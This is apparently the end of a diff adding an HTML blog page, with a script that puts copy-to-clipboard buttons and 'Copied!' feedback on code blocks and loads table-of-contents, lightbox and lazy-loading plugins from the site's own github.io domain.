+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
